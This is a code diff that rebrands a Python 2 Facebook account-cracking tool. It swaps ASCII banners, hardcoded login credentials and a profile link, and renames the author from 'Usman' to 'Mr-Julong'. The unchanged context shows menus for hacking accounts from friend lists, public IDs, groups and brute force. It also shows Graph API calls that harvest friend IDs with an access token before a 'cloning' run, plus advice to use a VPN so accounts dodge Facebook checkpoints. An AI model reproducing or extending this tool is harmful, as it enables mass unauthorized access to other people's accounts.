@@ -48,43 +48,17 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-\033[1;97m┴┬┴┬／￣＼＿／￣＼
-\033[1;97m┬┴┬┴▏　　▏▔▔▔▔＼
-\033[1;94m┴┬┴／＼　／　　　　　　﹨
-\033[1;97m┬┴∕　　　　　　　／　　　）
-\033[1;94m┴┬▏　　　　　　　　●　　▏
-\033[1;94m┬┴▏　　　　　　　　　　　▔█◤
-\033[1;97m┴◢██◣　　　　　　 ＼＿＿／
-\033[1;94m┬█████◣　　　　　　／　
-\033[1;96m┴█████████████ ◣
-\033[1;96m◢██████████████▆▄
-\033[1;97m█◤◢██ ◣◥█████████ ◤＼
-\033[1;96m◥◢ ████　████████◤　　 ＼
-\033[1;96m┴█████　██████◤　　　　　 ﹨
-\033[1;97m┬│　　　│█████ ◤　　　　　　　▏
-\033[1;95m┴│　　　│　　　　　　　　　　　　▏
-\033[1;95m┬∕　　　∕　　　　／▔▔▔＼　　   　 ∕
-\033[1;95m*∕＿＿_／﹨　　　∕　　　　﹨   　　／
-\033[1;95m┬┴┬┴┬┴＼ 　　 ＼_　　　　﹨　      ＼_
-\033[1;95m┴┬┴┬┴┬┴ ＼＿＿＿＼　　　 ﹨＿＿＿＿＼
-\033[1;91m_',,,/\_ _ _ _ _ _\
-\033[1;91m /_ |, _ _ _ _ _,/
-\033[1;97m/ _//, _ _ _ _ _ ,\\
-\033[1;91m|//_11_ 12_ 1_ \\
-\033[1;92m|| 10 . . . | . . . 2 ||
-\033[1;92m|| 9 . <~~' . . . 3 ||||
-\033[1;93m||_ 8 . . G9 . . 4 _||
-\033[1;93m|\\ _ 7 __ 6 _ 5_ //
-\033[1;94m\ _\\, _ _ _ _ _ ,//
-\033[1;94m_ \_|, _ _ _ _ _ ,|
-\033[1;97m_ _\/ _ _ _ _ _ /
-                         Usman Updated 0.3                   
-\033[1;91m        ♦♦♦———————————————————————————————♦♦♦
-"""
+\033[31;1m__  _____________     
+\033[31;1m/ / / / __/ __/ _ \          \033[32;1mDark V9
+\033[31;1m/ /_/ /\ \/ _// , _/    
+033[37;1m\\____/___/___/_/|_|__ __
+                  \033[71;1m/ _ \/ _ | / _ \/ //_/
+                  \033[37;1m/ // / __ |/ , _/ ,<   
+                  \033[37;1m/____/_/ |_/_/|_/_/|_|""" 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[31;1mMohon tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -98,35 +72,28 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-
-\033[1;91m╔╗─╔╗╔═══╗╔═╗╔═╗╔═══╗╔═╗─╔╗
-\033[1;92m║║─║║║╔═╗║║║╚╝║║║╔═╗║║║╚╗║║
-\033[1;93m║║─║║║╚══╗║╔╗╔╗║║║─║║║╔╗╚╝║
-\033[1;94m║║─║║╚══╗║║║║║║║║╚═╝║║║╚╗║║
-\033[1;95m║╚═╝║║╚═╝║║║║║║║║╔═╗║║║─║║║
-\033[1;96m╚═══╝╚═══╝╚╝╚╝╚╝╚╝─╚╝╚╝─╚═╝
-
-"""
-
-jalan("\033[1;94m•◈•───────•◈ NOT A NAME ITS BRAND •◈•───────•◈•")  
+\033[32;1m████▄  ▄▄▄       ██▀███   ██ ▄█▀
+\033[32;1m██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ 
+\033[32;1m██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ 
+\033[32;1m▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ 
+\033[32;1m▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄
+\033[32;1m▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
+\033[32;1m░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░
+\033[32;1m░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ 
+\033[32;1m░          ░  ░   ░     ░  ░ """ 
 
 
-jalan("\033[1;94m•◈•   _____ _____  ______ ______ _____ _____ ")
-jalan("\033[1;96m•◈•  / ____|  __ \|  ____|  ____|  __ \_   _|")
-jalan("\033[1;97m•◈• | (___ | |__) | |__  | |__  | |  | || |  ")
-jalan("\033[1;95m•◈•  \___ \|  ___/|  __| |  __| | |  | || |  ")
-jalan("\033[1;93m•◈•  ____) | |    | |____| |____| |__| || |_ ")
-jalan("\033[1;91m•◈• |_____/|_|    |______|______|_____/_____|")
- 
-jalan("   \033[1;91m All Country user use any proxy ")	
-jalan("   \033[1;94m Wifi User use any proxy ")	
+jalan("\033[1;94m•◈•───────•◈ NOT A NAME ITS Zul •◈•───────•◈•")  
 
-jalan("   \033[1;93m Welcome to Usman Tech ")
+jalan("\033[32;1m🔴INFORMASI TOOLS INI")
+jalan("\033[32;1mKALO MAU LOGIN GUNAKAN VPN")
+jalan("\033[32;1mMIN KENAPA HARUS GUNAIN VPN")
+jalan("\033[32;1mBIAR AKUN GAK KENA CEKPOIN SAMPE SINI PAHAM")
+jalan("Username :\033[32;1mJulong / Password :\033[32;1mJulong")
+jalan("\033[32;1m═══════════════════════════════════════════
 
-jalan("\033[1;97m•◈•──────────•◈•\033[1;96mDo not Best You \033[1;96m•◈•──────────•◈•")
-
-CorrectUsername = "khan"
-CorrectPassword = "khan"
+CorrectUsername = "Julong"
+CorrectPassword = "Julong"
 
 
 loop = 'true'
@@ -139,10 +106,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
+            os.system('xdg-open https://www.facebook.com/profile.php?id=100009709805324')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100009709805324')
 
 def login():
 	os.system('clear')
@@ -238,9 +205,9 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update khan"																														
-	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
+	print "\033[1;32;40m[1] \033[32;1m══Start Hack3ing"	
+	print "\033[1;32;40m[2] \033[32;1m══Update khan"																														
+	print "\033[1;32;40m[0] \033[32;1m══Log out"
 	pilih()
 
 def pilih():
@@ -253,9 +220,9 @@ def pilih():
 	elif unikers =="2":
 		os.system('clear')
 		print logo
-		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
+		print " \033[32;1m●════════════════════════◄►════════════════════════●\n"
 		os.system('git pull origin master')
-		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
+		raw_input('\n\033[1;97m[ \033[34;97mBack \033[1;97m]')
 		menu()
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -277,12 +244,12 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
-	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
-	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Group ID"
-	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
-	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
-	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
+	print "\x1b[1;32;40m[1] \033[32;1m══Hack From Friend List"
+	print "\x1b[1;32;40m[2] \033[32;1m══Hack From Public ID"
+	print "\x1b[1;32;40m[3] \033[32;1m══Hack From Group ID"
+	print "\x1b[1;32;40m[4] \033[32;1m══Hack Bruteforce"
+	print "\x1b[1;32;40m[5] \033[32;1m══Hack From File"
+	print "\x1b[1;32;40m[0] \033[32;1m══Back"
 	pilih_super()
 
 def pilih_super():
@@ -294,7 +261,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 
-		jalan('\033[1;97m[✺] Getting IDs \033[1;97m...')
+		jalan('\033[1;97m[✺] Getting ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -312,7 +279,7 @@ def pilih_super():
 			print"\033[1;97m[✺] ID Not Found!"
 			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 			super()
-		print"\033[1;35;40m[✺] Getting IDs..."
+		print"\033[1;35;40m[✺] Getting ID..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -339,16 +306,16 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] Total IDs : \033[1;97m"+str(len(id))
-	jalan('\033[1;34;40m[✺] Please Wait...')
+	print "\033[1;36;40m[✺] Total ID : \033[1;97m"+str(len(id))
+	jalan('\033[1;34;40m[✺] Waits...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
-	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
+	print "   \033[1;31;48m●══════════════════◄►══════════════════●"
 
-	jalan('                    \033[1;97mUsman start cloning Wait...')
-	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
+	jalan('                    \033[34;1mMr-Julong start cloning Wait...')
+	print  "  \033[1;36;48m ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
 		global cekpoint,oks
